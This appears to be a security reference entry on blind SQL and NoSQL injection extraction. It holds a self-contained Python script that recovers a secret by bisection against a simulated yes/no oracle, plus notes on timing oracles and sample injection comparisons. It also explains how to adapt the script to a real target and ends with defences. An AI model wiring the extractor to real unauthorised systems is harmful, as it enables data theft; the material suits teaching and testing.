---
title: "Blind Extraction - Binary Search Over a Character Space"
category: web
subcategory: sqli
type: script
tags: [blind-sqli, boolean-oracle, binary-search, bisection, character-space, substring, ascii, length-discovery, timing-oracle, median, information-theory, oracle, algorithm, python, nosqli, extraction]
summary: "The algorithm behind every blind-injection extractor: turn a yes/no oracle into a string, one bit at a time, in log2(charset) questions per character."
tools: [python]
related: [sqli-blind-boolean, sqli-blind-time, nosqli-mongodb, sqli-waf-bypass]
---

## Usage

```bash
# Runs entirely in-process against a simulated oracle. No network, no database.
python3 blind_sqli_exfil.py

# The module is importable: supply your own oracle function and reuse the search.
python3 -c "
from blind_sqli_exfil import extract, Question
secret = 'demo'
def oracle(q: Question) -> bool:
    if q.kind == 'length': return len(secret) > q.value
    if q.index >= len(secret): return False
    return ord(secret[q.index]) <= q.value
print(extract(oracle))
"
```

This file is about the **search**, not about delivery. Every blind-injection technique - boolean SQLi, time
SQLi, `$regex` NoSQL injection, an error/no-error side channel, a timing difference - reduces to the same
shape: you can ask yes/no questions, and you want a string. What differs between techniques is only how a
question is asked and how the answer is read. The algorithm below is the part that transfers.

## The idea

A yes/no oracle yields exactly **one bit** per question. A character drawn from an alphabet of size `n`
carries `log2(n)` bits. So the information-theoretic minimum is `ceil(log2(n))` questions per character, and
any method that spends more is wasting requests.

Two ways to spend them:

- **Linear scan**: "is it 'a'? is it 'b'? ..." - `n/2` questions on average, `n` worst case. Each question
  discards one candidate.
- **Bisection**: "is it in the first half?" - `ceil(log2(n))` questions, always. Each question discards half
  the candidates.

For the 95 printable ASCII characters that is 47.5 versus 7 - a factor of about seven. Over a 32-character
flag, roughly 1,520 requests versus 224. That difference is frequently what makes an extraction finish inside
a rate limit rather than not at all.

The requirement bisection imposes is that the oracle can answer an **ordering** question (`<=`), not just an
equality one. Every practical injection context provides this:

| Context | Ordering question |
|---------|------------------|
| SQL | `ASCII(SUBSTRING(secret,i,1)) <= 77` |
| SQL (portable) | `SUBSTRING(secret,i,1) <= 'M'` |
| MongoDB | `{"field": {"$regex": "^prefix[a-m]"}}` - a class, which bisects the same way |
| Any comparison | whatever the sink's comparison operator is |

If only equality is available, you are stuck with the linear scan; that is the one case where the cost model
changes.

## Length first

Extracting without knowing the length wastes questions on positions past the end, and leaves you unsure
whether you have finished. Discover it in two phases:

1. **Exponential probe**: `length > 1`, `> 2`, `> 4`, `> 8` ... until the answer is no. That brackets the
   length in `log2(L)` questions without needing an upper bound in advance.
2. **Bisection** inside the bracket: another `log2(L)` questions.

Total `2*log2(L)`, which for any realistic secret is under thirty questions. Cheap, and it makes the rest of
the run verifiable.

## Timing oracles

A time-based oracle returns a *measurement*, not a bit. Converting one to the other is where these runs go
wrong, because network jitter, server load and garbage collection all produce outliers. Three rules:

- **Use a threshold well clear of the noise floor.** Measure baseline latency first; the injected delay
  should be several times its standard deviation.
- **Repeat and take a median, not a mean.** A single slow response is common; three consecutive slow
  responses are not. The median of three is dramatically more robust than the mean of three, because one
  outlier cannot move it.
- **Verify at the end.** A timing run should always finish with a confirmation question that the recovered
  value is correct. If the oracle supports it, ask "does the whole secret equal X" once; a wrong bit
  anywhere makes that fail, which catches a misread cheaply.

The code below models this: a noisy timing oracle wraps the clean boolean one, and the median-of-N adapter
recovers the correct answer from it.

## Code

```python
#!/usr/bin/env python3
"""Blind extraction: turn a yes/no oracle into a string by bisection.

The search is the subject here. An oracle is any callable answering a Question
with a bool; the demo binds one to an in-process secret so the whole file runs
offline, with no network and no database.

    extract(oracle)                  -> the recovered string
    extract(oracle, charset=...)     -> restrict the alphabet (fewer questions)
    median_oracle(noisy, repeats=5)  -> harden a noisy/timing oracle

Run directly for a self-test that checks correctness and counts questions
against the information-theoretic minimum.
"""
from __future__ import annotations

import math
import random
import statistics
import string
import time
from dataclasses import dataclass, field
from typing import Callable

# The default alphabet. Narrowing it is the cheapest possible optimisation:
# questions per character is log2(len(charset)), so halving the alphabet saves
# one question per character.
PRINTABLE = string.printable[:95]
HEX_LOWER = string.digits + "abcdef"
FLAG_CHARS = string.ascii_letters + string.digits + "_{}-"


@dataclass(frozen=True)
class Question:
    """One yes/no question for the oracle.

    kind == "length": "is the secret longer than `value` characters?"
    kind == "char":   "is the codepoint at `index` <= `value`?"
    """
    kind: str
    value: int
    index: int = -1


Oracle = Callable[[Question], bool]


@dataclass
class Stats:
    questions: int = 0
    per_character: list[int] = field(default_factory=list)

    def theoretical_minimum(self, length: int, charset_size: int) -> int:
        return length * math.ceil(math.log2(charset_size))


def counting(oracle: Oracle, stats: Stats) -> Oracle:
    """Wrap an oracle so every question is counted."""
    def wrapped(question: Question) -> bool:
        stats.questions += 1
        return oracle(question)
    return wrapped


def discover_length(oracle: Oracle, limit: int = 4096) -> int:
    """Exponential probe to bracket the length, then bisect inside it."""
    # Phase 1: double until the answer flips to "no".
    high = 1
    while high < limit and oracle(Question("length", high)):
        high *= 2
    low = high // 2 if high > 1 else 0

    # Phase 2: bisect. Invariant: length > low, length <= high.
    while high - low > 1:
        mid = (low + high) // 2
        if oracle(Question("length", mid)):
            low = mid
        else:
            high = mid
    return high if oracle(Question("length", low)) else low


def extract_char(oracle: Oracle, index: int, charset: str) -> str | None:
    """Bisect the (sorted) charset to find the character at `index`.

    Each question halves the candidate range, so this always costs
    ceil(log2(len(charset))) questions - no best or worst case.
    """
    ordered = sorted(set(charset))
    codes = [ord(c) for c in ordered]
    low, high = 0, len(codes) - 1

    # Confirm the character is in the alphabet at all before spending the budget.
    if not oracle(Question("char", codes[high], index)):
        return None

    while low < high:
        mid = (low + high) // 2
        if oracle(Question("char", codes[mid], index)):
            high = mid
        else:
            low = mid + 1
    return chr(codes[low])


def extract(oracle: Oracle, charset: str = PRINTABLE,
            length: int | None = None, stats: Stats | None = None) -> str:
    """Recover the whole secret. Discovers the length unless one is given."""
    stats = stats or Stats()
    counted = counting(oracle, stats)

    if length is None:
        length = discover_length(counted)

    recovered: list[str] = []
    for index in range(length):
        before = stats.questions
        char = extract_char(counted, index, charset)
        stats.per_character.append(stats.questions - before)
        if char is None:
            break
        recovered.append(char)
    return "".join(recovered)


def linear_extract(oracle: Oracle, charset: str, length: int,
                   stats: Stats | None = None) -> str:
    """The naive scan, for comparison: one equality-shaped question per candidate."""
    stats = stats or Stats()
    counted = counting(oracle, stats)
    ordered = sorted(set(charset))
    recovered: list[str] = []
    for index in range(length):
        for i, candidate in enumerate(ordered):
            code = ord(candidate)
            # "<= c" and "<= c-1" together mean "== c"; the scan asks the first
            # and relies on ordering, which is the best a linear walk can do.
            if counted(Question("char", code, index)):
                recovered.append(candidate)
                break
    return "".join(recovered)


# --------------------------------------------------------------- oracles

def make_oracle(secret: str) -> Oracle:
    """A clean in-process oracle, standing in for a real injection.

    The two branches mirror what a real payload would express:
      length -> LENGTH(secret) > n
      char   -> ASCII(SUBSTRING(secret, i+1, 1)) <= n
    """
    def oracle(question: Question) -> bool:
        if question.kind == "length":
            return len(secret) > question.value
        if question.index >= len(secret):
            return False
        return ord(secret[question.index]) <= question.value
    return oracle


def make_timing_oracle(secret: str, *, delay: float = 0.05,
                       jitter: float = 0.01, flake: float = 0.10,
                       rng: random.Random | None = None):
    """A timing oracle: returns a measured duration, not a bool.

    Models the real problem - a true answer is slower, but jitter overlaps the
    threshold and occasional outliers cross it entirely.
    """
    truth = make_oracle(secret)
    rng = rng or random.Random(1337)

    def measure(question: Question) -> float:
        base = rng.uniform(0.0, jitter)
        elapsed = base + (delay if truth(question) else 0.0)
        if rng.random() < flake:               # an unrelated slow response
            elapsed += rng.uniform(delay, delay * 2)
        return elapsed
    return measure


def median_oracle(measure: Callable[[Question], float], threshold: float,
                  repeats: int = 5) -> Oracle:
    """Convert a noisy measurement oracle into a boolean one.

    Median, not mean: a single outlier cannot move a median, but it drags a
    mean across the threshold. Repeats must be odd for a clean median.
    """
    if repeats % 2 == 0:
        repeats += 1

    def oracle(question: Question) -> bool:
        samples = [measure(question) for _ in range(repeats)]
        return statistics.median(samples) > threshold
    return oracle


def verify(oracle: Oracle, candidate: str) -> bool:
    """Confirm a recovered value: length, then every character exactly.

    Always do this after a timing run. It costs a handful of questions and
    catches a single misread bit, which would otherwise be invisible.
    """
    if oracle(Question("length", len(candidate))):
        return False                            # secret is longer
    if len(candidate) and not oracle(Question("length", len(candidate) - 1)):
        return False                            # secret is shorter
    for index, char in enumerate(candidate):
        code = ord(char)
        if not oracle(Question("char", code, index)):
            return False
        if code > 0 and oracle(Question("char", code - 1, index)):
            return False
    return True


if __name__ == "__main__":
    SECRET = "CTF{bisection_beats_linear}"

    print("== 1. correctness ==")
    stats = Stats()
    recovered = extract(make_oracle(SECRET), charset=PRINTABLE, stats=stats)
    print(f"  secret    {SECRET!r}")
    print(f"  recovered {recovered!r}")
    print(f"  questions {stats.questions}")
    assert recovered == SECRET, f"{recovered!r} != {SECRET!r}"

    print("\n== 2. cost: bisection vs linear scan ==")
    bisect_stats = Stats()
    extract(make_oracle(SECRET), charset=PRINTABLE,
            length=len(SECRET), stats=bisect_stats)
    linear_stats = Stats()
    linear_extract(make_oracle(SECRET), PRINTABLE, len(SECRET), linear_stats)

    minimum = bisect_stats.theoretical_minimum(len(SECRET), len(set(PRINTABLE)))
    print(f"  length              {len(SECRET)} chars, alphabet {len(set(PRINTABLE))}")
    print(f"  theoretical minimum {minimum} questions")
    print(f"  bisection           {bisect_stats.questions} questions")
    print(f"  linear scan         {linear_stats.questions} questions")
    print(f"  speed-up            {linear_stats.questions / bisect_stats.questions:.1f}x")

    per_char = math.ceil(math.log2(len(set(PRINTABLE))))
    costs = bisect_stats.per_character
    # Bisection costs at most ceil(log2(n)) questions plus one in-alphabet probe.
    # The +/-1 spread comes from the shape of the search tree, NOT from which
    # character it is - unlike a linear scan, where 'a' costs 1 and '~' costs 95.
    assert all(q <= per_char + 1 for q in costs), costs
    assert max(costs) - min(costs) <= 1, f"cost is character-independent: {costs}"
    print(f"  per character       {min(costs)}-{max(costs)} questions, "
          f"regardless of which character it is")
    assert bisect_stats.questions < linear_stats.questions / 4
    assert bisect_stats.questions <= minimum + len(SECRET) + 2

    print("\n== 3. narrowing the alphabet is free speed ==")
    narrow_stats = Stats()
    narrow = extract(make_oracle(SECRET), charset=FLAG_CHARS,
                     length=len(SECRET), stats=narrow_stats)
    assert narrow == SECRET
    print(f"  alphabet {len(set(PRINTABLE)):>3} chars -> {bisect_stats.questions} questions")
    print(f"  alphabet {len(set(FLAG_CHARS)):>3} chars -> {narrow_stats.questions} questions")
    assert narrow_stats.questions < bisect_stats.questions, \
        "a smaller alphabet means fewer bits per character"

    print("\n== 4. length discovery ==")
    for secret in ("a", "abcdefgh", "x" * 100, SECRET):
        stats = Stats()
        found = discover_length(counting(make_oracle(secret), stats))
        print(f"  len={len(secret):<4} discovered={found:<4} in {stats.questions} questions")
        assert found == len(secret), f"{found} != {len(secret)}"
        assert stats.questions <= 2 * max(1, math.ceil(math.log2(len(secret) + 1))) + 4

    print("\n== 5. a noisy timing oracle needs repeats, not a single sample ==")
    short = "ctf{timing}"
    threshold = 0.03      # comfortably above the jitter floor, below the delay

    # One sample per question: a single flaky response is read as an answer.
    measure = make_timing_oracle(short, rng=random.Random(7))
    single = median_oracle(measure, threshold, repeats=1)
    noisy_result = extract(single, charset=FLAG_CHARS, length=len(short))
    print(f"  1 sample  -> {noisy_result!r}  {'ok' if noisy_result == short else 'WRONG'}")

    # Median of nine: an outlier cannot move the median, so the run survives.
    measure = make_timing_oracle(short, rng=random.Random(7))
    robust = median_oracle(measure, threshold, repeats=9)
    clean_result = extract(robust, charset=FLAG_CHARS, length=len(short))
    print(f"  9 samples -> {clean_result!r}  {'ok' if clean_result == short else 'WRONG'}")

    assert clean_result == short, "median of 9 should survive this noise level"
    assert noisy_result != short, "the single-sample run should be corrupted by noise"
    print("  -> the median is what makes a timing oracle usable; one sample is not")
    print(f"  -> cost: {9}x the questions, which is why you narrow the alphabet first")

    print("\n== 6. always verify a timing-derived result ==")
    clean = make_oracle(short)
    assert verify(clean, short), "correct value verifies"
    assert not verify(clean, short[:-1]), "too short is caught"
    assert not verify(clean, short + "x"), "too long is caught"
    assert not verify(clean, short[:-1] + "X"), "a single wrong character is caught"
    print("  verify() catches wrong length and any single wrong character")

    print("\n== 7. timing the real cost ==")
    start = time.perf_counter()
    stats = Stats()
    extract(make_oracle(SECRET), charset=FLAG_CHARS, stats=stats)
    elapsed = time.perf_counter() - start
    print(f"  {stats.questions} questions in {elapsed * 1000:.1f} ms in-process")
    print(f"  at 200 ms/request over a network that would be "
          f"{stats.questions * 0.2 / 60:.1f} minutes")

    print("\nself-test ok")
```

## Adapting it

To use the search against a real target, write an oracle that expresses a `Question` in whatever the sink
understands and reads the answer back. The two branches you must implement:

- `kind == "length"` -> a question meaning "is the secret longer than `value`".
- `kind == "char"` -> a question meaning "is the codepoint at `index` at most `value`".

Everything else - the bisection, the length discovery, the counting, the median adapter, the verification -
is independent of the injection context and does not change. That separation is the reason to structure an
extractor this way: the interesting half is reusable across SQL, NoSQL, LDAP, XPath and any other setting
that offers a comparison.

Practical notes for a real oracle:

- **Make the boolean genuinely reliable before optimising.** An extractor built on a flaky oracle produces
  confidently wrong output, and you will not know which character is wrong. Establish the yes/no distinction
  on a known value first.
- **Bound the alphabet from what you know.** A hex digest, a UUID, a flag format - each shrinks the alphabet
  and therefore the question count.
- **Respect rate limits.** The bisection already minimises questions; going faster than the target tolerates
  produces errors that look like oracle answers.
- **Verify at the end**, particularly for timing.

## Variants & pitfalls

- **Off-by-one in the length.** Decide whether your length question is `>` or `>=` and be consistent; the
  bisection invariant depends on it.
- **1-indexed `SUBSTRING`.** SQL's `SUBSTRING(s, i, 1)` starts at 1, while the code above indexes from 0.
  That conversion belongs in the oracle.
- **Case-insensitive comparison** collapses the alphabet silently, so a bisection over a mixed-case charset
  returns the wrong character. Check whether the comparison is case-sensitive before trusting the result.
- **Collation affects ordering.** A database whose collation orders characters unexpectedly breaks the
  assumption that codepoint order matches comparison order. `ASCII()`/`ORD()` around the comparison avoids it.
- **An oracle that is wrong in one direction only** (false negatives but no false positives, say) can still
  be used, but the bisection must be restructured; the median adapter assumes symmetric noise.
- **Characters outside the alphabet** make `extract_char` return `None` and the loop stop early. That is
  deliberate - a silently truncated result is worse than a short one.
- **Concurrency is not in this file** on purpose: it multiplies the request rate, which is usually the
  binding constraint, and it makes a flaky oracle far harder to diagnose. Get it correct serially first.

### Defence / what closes this

A blind-extraction oracle exists because a response differs observably on a condition the attacker chose.
Removing the injection removes it: parameterised queries for SQL, type-checked queries for document stores.
Beyond that, make responses uniform - identical status, body and length for both branches of an
authentication or lookup failure - so there is no bit to read. Remove timing differences on security-relevant
comparisons by using constant-time comparison for secrets and by not letting user input control query cost.
Rate-limit per account and per address, and alert on the access pattern itself: a long run of near-identical
requests differing by one parameter value is a highly distinctive signature, and it is usually easier to
detect than to prevent.

## References

- PortSwigger, blind SQL injection: https://portswigger.net/web-security/sql-injection/blind
- OWASP Testing Guide, testing for SQL injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PayloadsAllTheThings, SQL injection (blind): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- Python `statistics` module: https://docs.python.org/3/library/statistics.html
